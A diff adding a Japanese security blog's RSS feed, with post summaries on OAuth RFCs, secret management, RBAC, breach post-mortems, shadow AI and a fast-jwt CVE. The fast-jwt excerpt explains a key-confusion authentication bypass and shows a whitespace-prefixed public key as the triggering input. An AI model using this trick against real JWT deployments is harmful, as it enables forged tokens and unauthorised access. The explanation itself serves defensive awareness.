@@ -1,0 +1,1252 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>セキュリティ on hdknr blog</title><link>https://hdknr.github.io/blogs/categories/%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3/</link><description>Recent content in セキュリティ on hdknr blog</description><generator>Hugo -- 0.161.1</generator><language>ja</language><lastBuildDate>Wed, 24 Jun 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://hdknr.github.io/blogs/categories/%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3/index.xml" rel="self" type="application/rss+xml"/><item><title>モバイルアプリの「1回ログイン → サービスごとのトークン」を支える仕組み — OAuth RFC 7523 入門</title><link>https://hdknr.github.io/blogs/posts/2026/06/mobile-token-exchange-rfc-7523/</link><pubDate>Wed, 24 Jun 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/06/mobile-token-exchange-rfc-7523/</guid><description>ネイティブアプリから複数のバックエンドを叩くとき、ログインは1回・トークンはサービスごとに分けたい。その答えが署名付き JWT を提示して各サービスにトークンを発行してもらう OAuth の RFC 7523（JWT Bearer Grant）だ。IdP・RP・モバイルアプリ3者の連携を図で解説する。</description></item><item><title>SecSuite — OSINT収集からAI修復まで統合したオープンソースセキュリティプラットフォームが登場</title><link>https://hdknr.github.io/blogs/posts/2026/06/secsuite-ai-security-platform/</link><pubDate>Tue, 16 Jun 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/06/secsuite-ai-security-platform/</guid><description>OSINT収集・Web脆弱性診断・APIセキュリティ評価・AI修復支援を一元化したオープンソースツール「SecSuite」が登場。ローカルAI（Ollama）対応で完全オフライン環境でも動作する。</description></item><item><title>Claude Code でMacをセキュリティ監査する — Pieter Levels流、一言頼むだけで未設定項目を洗い出す方法</title><link>https://hdknr.github.io/blogs/posts/2026/05/pieter-levels-claude-code-security-audit-mac/</link><pubDate>Thu, 21 May 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/05/pieter-levels-claude-code-security-audit-mac/</guid><description>&lt;p&gt;Pieter Levels（@levelsio）は Claude Code を使って自分の MacBook Pro をセキュリティ監査した。すると、設定していなかった項目が次々と見つかったという。その方法はシンプルで、Claude Code に「このコンピューターをセキュリティ監査して」と頼むだけだ。&lt;/p&gt;
+&lt;h2 id="pieter-levels-のツイート"&gt;Pieter Levels のツイート&lt;/h2&gt;
+&lt;p&gt;Pieter Levels は PhotoAI（月間収益 $100K）や RemoteOK（同 $44K）など複数のプロダクトを一人で運営するインディー開発者で、VPS サーバーの管理にも Claude Code を活用している。&lt;/p&gt;
+&lt;p&gt;彼のツイートの要点は以下のとおり：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;A nice way to stay safe is to ask Claude Code to audit your devices&lt;/p&gt;
+&lt;p&gt;I do same on my VPS servers, so today I tried it on my MacBook Pro and it&amp;rsquo;s pretty good at it too&lt;/p&gt;
+&lt;p&gt;It founds lots of stuff that was not secured, I actually forgot to enable FileVault when I got this new MBP in&lt;/p&gt;</description></item><item><title>SOPS復号後の secrets を GitHub Actions ログに平文露出した話 — masking バグの根本原因と4層防御の post-mortem</title><link>https://hdknr.github.io/blogs/posts/2026/05/sops-github-actions-secrets-leak-postmortem/</link><pubDate>Thu, 21 May 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/05/sops-github-actions-secrets-leak-postmortem/</guid><description>SOPS で暗号化した secrets を GitHub Actions ログに平文露出した実インシデントの post-mortem。::add-mask:: 登録ループが存在しない一時ファイルを参照していたバグの根本原因、即時対応 (run 削除 + rotate)、source-from-file パターン + workflow lint による4層防御まで詳説。</description></item><item><title>バイブコーディングの落とし穴 — AIで爆速アプリを作っても、セキュリティを無視したら法廷行き</title><link>https://hdknr.github.io/blogs/posts/2026/05/vibecoding-security-checklist/</link><pubDate>Wed, 20 May 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/05/vibecoding-security-checklist/</guid><description>AIで高速開発したアプリを本番公開する前に必ず確認すべき5つのセキュリティチェックリスト。SQLインジェクション・.env漏洩・プライバシーポリシー整備・レートリミット・APIキー隔離を、OWASP ZAP・slowapi・Next.jsのコード例とともに解説。</description></item><item><title>SOPS で AI エージェントのシークレット管理 — Claude Code に「平文を見せない」3つのガードレール</title><link>https://hdknr.github.io/blogs/posts/2026/05/sops-ai-agent-secrets-management/</link><pubDate>Tue, 12 May 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/05/sops-ai-agent-secrets-management/</guid><description>Claude Code などの AI エージェントに SOPS で暗号化されたシークレットを安全に扱わせるための3つのガードレール（平文をコンテキストに載せない／コミットさせない／復号鍵を分離する）と、Linux / macOS / Windows それぞれでの sops exec-env を使ったランタイム注入の具体例、permissions.deny の設定例を解説します。</description></item><item><title>RBAC 入門 — ロールベースアクセス制御の仕組み・ABAC との違い・実装例（AWS / Kubernetes）</title><link>https://hdknr.github.io/blogs/posts/2026/05/rbac-role-based-access-control/</link><pubDate>Mon, 11 May 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/05/rbac-role-based-access-control/</guid><description>&lt;p&gt;&lt;strong&gt;RBAC（Role-Based Access Control：ロールベースアクセス制御）とは、ユーザーに直接権限を与えず、ロールを介して権限を管理する仕組みです。&lt;/strong&gt; AWS の IAM、Kubernetes、GitHub、Microsoft 365 など、現代のほとんどのプラットフォームがこの考え方を基盤にしています。&lt;/p&gt;
+&lt;p&gt;一言で言うと、「社員一人ひとりに鍵を渡すのではなく、役職ごとのマスターキーを管理する」仕組みです。本記事では RBAC の基本構造、必要性、ABAC との違い、AWS IAM・Kubernetes での実装例までをまとめます。&lt;/p&gt;
+&lt;h2 id="rbac-の基本構造"&gt;RBAC の基本構造&lt;/h2&gt;
+&lt;p&gt;RBAC は主に 3 つの要素の組み合わせで成り立っています。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;ユーザー (User)&lt;/strong&gt; — システムを利用する個人&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;ロール (Role)&lt;/strong&gt; — 「管理者」「編集者」「閲覧者」といった役割。権限の集合体&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;パーミッション (Permission)&lt;/strong&gt; — 「ファイルの読み取り」「データの削除」といった具体的な操作権限&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;ユーザーは直接パーミッションを持つのではなく、ロールを介して権限を獲得します。この「間接化」が RBAC の本質です。&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://hdknr.github.io/blogs/images/rbac-structure.png" alt="ユーザーがロールに割り当てられ、ロールがパーミッションを付与する RBAC の3階層モデル"&gt;&lt;/p&gt;
+&lt;h2 id="なぜ-rbac-が必要なのか"&gt;なぜ RBAC が必要なのか&lt;/h2&gt;
+&lt;p&gt;従来の ACL ベースの管理（ユーザーごとにリソースの権限を個別に設定する方式）では、組織が大きくなるにつれて管理が破綻します。RBAC を導入することで、以下のメリットが得られます。&lt;/p&gt;
+&lt;h3 id="1-管理の効率化"&gt;1. 管理の効率化&lt;/h3&gt;
+&lt;p&gt;異動や入社があった際、個別に何十もの設定を変更する必要がなく、適切な「ロール」を割り当てるだけで済みます。退職時もロールを外せば一括で権限が剥奪されます。&lt;/p&gt;
+&lt;h3 id="2-セキュリティの向上最小権限の原則"&gt;2. セキュリティの向上（最小権限の原則）&lt;/h3&gt;
+&lt;p&gt;業務に必要な権限だけをセットにしたロールを作成することで、過剰な権限付与によるリスクを防げます。最小権限の原則（Principle of Least Privilege）を組織的に実現する手段として最も普及しているのが RBAC です。&lt;/p&gt;
+&lt;h3 id="3-コンプライアンスの強化"&gt;3. コンプライアンスの強化&lt;/h3&gt;
+&lt;p&gt;「誰がどのような権限を持っているのか」をロール単位で把握できるため、監査が容易になります。SOC 2、ISO 27001、PCI DSS などのコンプライアンス監査では、アクセス権限のレビューが必須項目になっており、RBAC ベースの設計だとレポート作成が圧倒的に楽になります。&lt;/p&gt;
+&lt;h2 id="具体例ドキュメント管理システム"&gt;具体例：ドキュメント管理システム&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;ユーザー&lt;/th&gt;
+&lt;th&gt;割り当てられたロール&lt;/th&gt;
+&lt;th&gt;実行できる操作 (パーミッション)&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;佐藤さん&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;管理者 (Admin)&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;作成、編集、削除、ユーザー追加&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;鈴木さん&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;編集者 (Editor)&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;作成、編集&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;高橋さん&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;閲覧者 (Viewer)&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;閲覧のみ&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;もし鈴木さんが管理者に昇進した場合、鈴木さんの設定を一つずつ変えるのではなく、付与するロールを「編集者」から「管理者」へ切り替えるだけで、すべての権限が更新されます。&lt;/p&gt;</description></item><item><title>エアギャップ攻撃 ODINI — CPU 磁気放射でファラデーケージを突破するマルウェアの全貌</title><link>https://hdknr.github.io/blogs/posts/2026/05/odini-air-gap-cpu-magnetic-exfiltration/</link><pubDate>Mon, 11 May 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/05/odini-air-gap-cpu-magnetic-exfiltration/</guid><description>CPU の磁気放射を悪用してファラデーケージ付きエアギャップ PCからデータを盗み出す ODINI マルウェアの攻撃原理・スペック・対策を解説。</description></item><item><title>Claude Code はなぜ事前登録なしで MCP に繋がるのか — RFC 7591 Dynamic Client Registration と連動 RFC 群</title><link>https://hdknr.github.io/blogs/posts/2026/05/rfc7591-dynamic-client-registration-mcp/</link><pubDate>Fri, 08 May 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/05/rfc7591-dynamic-client-registration-mcp/</guid><description>MCP クライアントが事前登録なしで認可サーバーに繋がる仕組みを RFC 7591（Dynamic Client Registration）と RFC 9728 / 8414 / 9068 / 8707 / 7636 の連動から解説。Claude Code の自動ログインフローと JWT audience 検証でハマる構造を仕様レベルで追える。</description></item><item><title>コードを1行も読ませずに AI で脆弱性を100%特定する — AST Deep Structure Map アプローチ（理論編）</title><link>https://hdknr.github.io/blogs/posts/2026/04/ai-ast-vulnerability-detection/</link><pubDate>Mon, 27 Apr 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/04/ai-ast-vulnerability-detection/</guid><description>Python の ast モジュールで生成した Deep Structure Map を LLM に渡す脆弱性検出アプローチを解説。Taint Analysis の理論とともに、AI コードレビューの精度を上げる手法を紹介します。</description></item><item><title>CAMPFIRE 個人情報漏洩から学ぶ — GitHub アカウント侵害が招く CI/CD セキュリティリスク</title><link>https://hdknr.github.io/blogs/posts/2026/04/campfire-github-cd-security/</link><pubDate>Sat, 25 Apr 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/04/campfire-github-cd-security/</guid><description>&lt;p&gt;クラウドファンディングプラットフォーム CAMPFIRE が、GitHub アカウントへの不正アクセスを起点に最大 22 万 5,846 件の個人情報が漏洩した可能性があると発表しました（2026 年 4 月 24 日）。単なる「パスワード流出」ではなく、&lt;strong&gt;CD パイプラインを悪用してインフラを乗っ取るという、現代の DevOps が抱えるリスクを象徴するインシデント&lt;/strong&gt;です。本記事ではエンジニア視点で攻撃経路を分析し、再発防止策を考えます。&lt;/p&gt;
+&lt;h2 id="インシデントの経緯"&gt;インシデントの経緯&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;日時&lt;/th&gt;
+&lt;th&gt;出来事&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;2026-04-02 22:50&lt;/td&gt;
+&lt;td&gt;GitHub アカウントへの不正アクセスを検知。一部ソースコードが閲覧された可能性（初報）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;2026-04-14&lt;/td&gt;
+&lt;td&gt;第二報：社員・取引先情報の閲覧可能状態を確認&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;2026-04-22&lt;/td&gt;
+&lt;td&gt;第三報：顧客情報管理システムへの不正アクセス痕跡を確認&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;2026-04-24&lt;/td&gt;
+&lt;td&gt;個人情報漏洩の可能性を正式発表（最大 22 万 5,846 件）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;漏洩した可能性がある情報は以下のとおりです:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;プロジェクト実行者&lt;/strong&gt; 12 万 929 件：氏名・住所・電話番号・口座情報など（2021 年 2 月以降）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;支援者&lt;/strong&gt; 13 万 155 件：氏名・住所・口座情報など（PayPal 決済、後払い、口座送金返金ユーザー）&lt;/li&gt;
+&lt;li&gt;うち &lt;strong&gt;8 万 2,465 件&lt;/strong&gt;が口座情報を含む&lt;/li&gt;
+&lt;li&gt;クレジットカード情報は対象外（CAMPFIRE 公式発表）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="推定される攻撃経路"&gt;推定される攻撃経路&lt;/h2&gt;
+&lt;p&gt;エンジニア向け技術解説として、@poly_soft（勝又健太）氏が X（旧 Twitter）で以下の攻撃チェーンを推察しています。この分析は公式発表を補完する形で、攻撃者が具体的にどう動いたかを示しています（以下はあくまで推定です）。&lt;/p&gt;
+&lt;h3 id="step-1-cd-権限を持つ-github-アカウントの侵害推定"&gt;Step 1: CD 権限を持つ GitHub アカウントの侵害（推定）&lt;/h3&gt;
+&lt;p&gt;攻撃者が最初に侵害したのは、&lt;strong&gt;単独で CD（継続的デプロイ）をトリガーできる権限を持つ GitHub アカウント&lt;/strong&gt;であったと推定されます。&lt;/p&gt;
+&lt;p&gt;問題の設定として考えられるのは:&lt;/p&gt;</description></item><item><title>Infisical — .env に別れを告げるオープンソース・シークレット管理プラットフォーム</title><link>https://hdknr.github.io/blogs/posts/2026/04/infisical-secret-management/</link><pubDate>Tue, 21 Apr 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/04/infisical-secret-management/</guid><description>Infisical は .env ファイルに依存しないオープンソースのシークレット管理プラットフォーム。チーム開発・Kubernetes・GitHub Actions・AI エージェントと統合でき、シークレットをランタイム取得することでディスク上の漏洩リスクを排除します。</description></item><item><title>シャドーAIがもたらす見えないリスク：IT承認外のAIツール利用が企業に生む新たな盲点</title><link>https://hdknr.github.io/blogs/posts/2026/04/shadow-ai-risks/</link><pubDate>Wed, 15 Apr 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/04/shadow-ai-risks/</guid><description>&lt;p&gt;生成 AI ツールの急速な普及により、IT 部門の承認を経ずに従業員が独自に AI を活用する「シャドー AI」が企業セキュリティの新たな盲点として注目されている。本記事では、シャドー AI が引き起こすリスクと、その対策について整理する。&lt;/p&gt;
+&lt;h2 id="シャドー-ai-とは"&gt;シャドー AI とは&lt;/h2&gt;
+&lt;p&gt;「シャドー IT」は以前からある概念だが、生成 AI の登場でその問題は一段と深刻になった。**シャドー AI（Shadow AI）**とは、IT 部門や情報セキュリティ部門の審査・承認を受けずに、従業員が業務で使用する AI ツールやサービスのことを指す。&lt;/p&gt;
+&lt;p&gt;ChatGPT・Gemini・Claude・Copilot などの生成 AI サービスは、個人アカウントで無料または低コストで利用できる。利便性が高いため、IT 部門の手続きを待たずに「とりあえず使ってみる」ケースが後を絶たない。&lt;/p&gt;
+&lt;p&gt;調査によれば、&lt;strong&gt;従業員の約 40% が業務で非承認の生成 AI ツールを使用している&lt;/strong&gt;とされており、多くの企業でシャドー AI が組織的な管理の外に広がっている。&lt;/p&gt;
+&lt;h2 id="シャドー-ai-が生む具体的なリスク"&gt;シャドー AI が生む具体的なリスク&lt;/h2&gt;
+&lt;h3 id="1-機密情報個人情報の漏洩"&gt;1. 機密情報・個人情報の漏洩&lt;/h3&gt;
+&lt;p&gt;最も深刻なリスクは、社内の機密情報が AI サービス側に送信されることによるデータ漏洩だ。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;実例: Samsung の機密漏洩事件（2023年）&lt;/strong&gt;&lt;br&gt;
+Samsung の半導体部門の社員が、ChatGPT に機密のソースコードを貼り付けてデバッグを依頼したり、社内会議の音声を要約させたりした結果、社内機密が外部サーバーに送信されたインシデントが発生した。この件が発覚した後、Samsung は社内での ChatGPT 利用を一時禁止している。&lt;/p&gt;
+&lt;p&gt;社員が AI に入力する情報として問題になりやすいのは:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;ソースコード・設計仕様書&lt;/li&gt;
+&lt;li&gt;顧客情報・個人情報（氏名、メールアドレス、契約情報など）&lt;/li&gt;
+&lt;li&gt;財務データ・未公開の経営情報&lt;/li&gt;
+&lt;li&gt;社内メール・会議議事録&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;多くの商用 AI サービスは、無料プランやデフォルト設定では入力データをモデルの学習・改善に利用する場合がある。エンタープライズ契約や特定のオプト設定が必要だが、シャドー利用ではそのような設定は行われていない。&lt;/p&gt;
+&lt;h3 id="2-コンプライアンス規制違反"&gt;2. コンプライアンス・規制違反&lt;/h3&gt;
+&lt;p&gt;個人情報保護法（GDPR、日本の個人情報保護法）や業界固有の規制（医療分野の HIPAA、金融分野の各種規制）では、個人情報の取り扱いに厳しい要件がある。IT 部門の審査を通じて利用規約・データ処理契約を確認せずに AI ツールを使用すると、意図せず法令違反を犯す可能性がある。&lt;/p&gt;
+&lt;h3 id="3-ai-の出力に対する品質責任管理の欠如"&gt;3. AI の出力に対する品質・責任管理の欠如&lt;/h3&gt;
+&lt;p&gt;生成 AI はハルシネーション（事実と異なる情報の生成）を起こす。IT 部門・品質管理部門が把握していないツールを使って作成された成果物がそのままリリースや提案書に使われると、品質問題に発展しうる。&lt;/p&gt;</description></item><item><title>バイブコーディングの怖い話：AI丸投げ開発が招いた医療データ流出事件</title><link>https://hdknr.github.io/blogs/posts/2026/04/vibe-coding-security-risk/</link><pubDate>Wed, 15 Apr 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/04/vibe-coding-security-risk/</guid><description>&lt;p&gt;海外で発生した実際のインシデント「An AI Vibe Coding Horror Story」を元に、AI に開発を丸投げするリスクを解説します。技術的リテラシーのないまま本番環境を構築した結果、患者データが完全露出するという深刻な事態が起きました。&lt;/p&gt;
+&lt;!-- more --&gt;
+&lt;h2 id="何が起きたのか"&gt;何が起きたのか&lt;/h2&gt;
+&lt;p&gt;専門知識のない医療従事者が、AI を使って自分専用の患者管理システムをゼロから自作しました。業界で実績のある既存ソフトウェアを使わず、「自分のバイブ（感覚）」で開発を進めたのです。&lt;/p&gt;
+&lt;p&gt;元記事: &lt;a href="https://www.tobru.ch/an-ai-vibe-coding-horror-story/"&gt;An AI Vibe Coding Horror Story&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id="システムの問題点"&gt;システムの問題点&lt;/h2&gt;
+&lt;p&gt;AI が生成したこのアプリには、致命的なセキュリティ上の欠陥が多数ありました。&lt;/p&gt;
+&lt;h3 id="アーキテクチャの問題"&gt;アーキテクチャの問題&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;単一 HTML ファイル構成&lt;/strong&gt;: すべてのプログラムが 1 つの HTML ファイルに詰め込まれた簡素な構造&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;クライアントサイド認証&lt;/strong&gt;: パスワードなどの認証機能がブラウザ側の処理だけで実装されていた&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;アクセス制御なし&lt;/strong&gt;: データベースへのアクセス制限が全くなく、誰でも中身を閲覧できる状態&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="データ管理の問題"&gt;データ管理の問題&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;蓄積されていた大量の患者データをそのまま自作アプリに移行&lt;/li&gt;
+&lt;li&gt;全データが暗号化されず、無防備な状態で公開サーバーに配置&lt;/li&gt;
+&lt;li&gt;適切なセキュリティ設定をしないままインターネット上に公開&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="プライバシーの問題"&gt;プライバシーの問題&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;診察中の会話を録音し、外部の AI サービスに送信して要約させる機能を実装&lt;/li&gt;
+&lt;li&gt;患者の個人情報や音声データが、事前の同意なく海外のサーバーへ転送&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="被害の深刻さ"&gt;被害の深刻さ&lt;/h2&gt;
+&lt;p&gt;わずか &lt;strong&gt;30 分の調査&lt;/strong&gt; で、全ての患者データに対する読み書き権限が奪取されました。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;患者の個人情報が完全に露出&lt;/li&gt;
+&lt;li&gt;音声データも含めた機密情報が外部に流出&lt;/li&gt;
+&lt;li&gt;現地の個人情報保護法や医療従事者の守秘義務に違反している可能性が極めて高い状況&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="問題の本質"&gt;問題の本質&lt;/h2&gt;
+&lt;p&gt;不備を指摘された本人は、&lt;strong&gt;AI が生成した定型文で回答&lt;/strong&gt;し、問題の深刻さを理解していませんでした。&lt;/p&gt;
+&lt;p&gt;これはバイブコーディングの本質的なリスクを示しています：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;AI はコードを生成できるが、&lt;strong&gt;セキュリティ要件の判断はできない&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;開発者が仕組みを理解していないと、問題が起きても原因を特定できない&lt;/li&gt;
+&lt;li&gt;「動いているように見える」と「安全に動いている」は全く別の話&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="開発の民主化とリテラシーのトレードオフ"&gt;開発の民主化とリテラシーのトレードオフ&lt;/h2&gt;
+&lt;p&gt;AI によって開発の民主化が進み、非エンジニアでもアプリケーションを作れる時代になりました。一方で、最低限の技術的リテラシーがないと重大な事故を招くリスクも同時に高まっています。&lt;/p&gt;
+&lt;p&gt;特に以下の領域では、専門知識なしの AI 開発は高リスクです：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;領域&lt;/th&gt;
+&lt;th&gt;リスク&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;医療・健康データ&lt;/td&gt;
+&lt;td&gt;個人情報保護法・医療法違反&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;金融データ&lt;/td&gt;
+&lt;td&gt;金融規制・顧客情報保護&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;個人認証システム&lt;/td&gt;
+&lt;td&gt;なりすまし・不正アクセス&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;本番環境のインフラ&lt;/td&gt;
+&lt;td&gt;サービス停止・データ消失&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id="まとめ"&gt;まとめ&lt;/h2&gt;
+&lt;p&gt;バイブコーディングは強力なツールですが、&lt;strong&gt;「AI に生成させたコードを理解できる人間が監督する」&lt;/strong&gt; という原則なしには危険です。&lt;/p&gt;</description></item><item><title>fast-jwt の認証バイパス脆弱性 CVE-2026-34950 — 空白文字一つで JWT 認証が突破される</title><link>https://hdknr.github.io/blogs/posts/2026/04/fast-jwt-cve-2026-34950/</link><pubDate>Mon, 06 Apr 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/04/fast-jwt-cve-2026-34950/</guid><description>&lt;p&gt;JWT 認証ライブラリ &lt;code&gt;fast-jwt&lt;/code&gt; に重大な脆弱性が発見された。公開鍵の先頭に空白文字や改行があるだけで認証が突破される可能性があり、影響はバージョン 6.1.0 以下に及ぶ。&lt;/p&gt;
+&lt;h2 id="fast-jwt-とは"&gt;fast-jwt とは&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;fast-jwt&lt;/code&gt; は Node.js 向けの高速な JWT（JSON Web Token）の署名・検証ライブラリ。パフォーマンスを重視した実装で広く利用されているが、今回その内部の文字列処理と正規表現の甘さが致命的な脆弱性につながった。&lt;/p&gt;
+&lt;h2 id="cve-2026-34950-空白文字による認証バイパス"&gt;CVE-2026-34950: 空白文字による認証バイパス&lt;/h2&gt;
+&lt;h3 id="問題の概要"&gt;問題の概要&lt;/h3&gt;
+&lt;p&gt;CVSS スコア &lt;strong&gt;9.1（Critical）&lt;/strong&gt; の深刻な脆弱性。公開鍵の検証に使われている正規表現が、文字列の&lt;strong&gt;先頭を厳密に検証していない&lt;/strong&gt;という欠陥に起因する。&lt;/p&gt;
+&lt;h3 id="攻撃メカニズム"&gt;攻撃メカニズム&lt;/h3&gt;
+&lt;p&gt;公開鍵の先頭にスペースや改行文字（&lt;code&gt;\n&lt;/code&gt;）が含まれると、正規表現による公開鍵の検証が失敗する。その結果、公開鍵が &lt;strong&gt;HMAC 用の秘密鍵として誤って扱われ&lt;/strong&gt;、攻撃者は任意のトークンを署名できてしまう。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;"&gt;&lt;tr&gt;&lt;td style="vertical-align:top;padding:0;margin:0;border:0;"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;2
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;3
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;4
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;5
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;6
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;7
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;8
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-text" data-lang="text"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;// 通常の公開鍵（検証成功）
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-----BEGIN PUBLIC KEY-----
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;-----END PUBLIC KEY-----
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;// 先頭に空白が入った場合（検証失敗 → HMAC 鍵として扱われる）
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -----BEGIN PUBLIC KEY-----
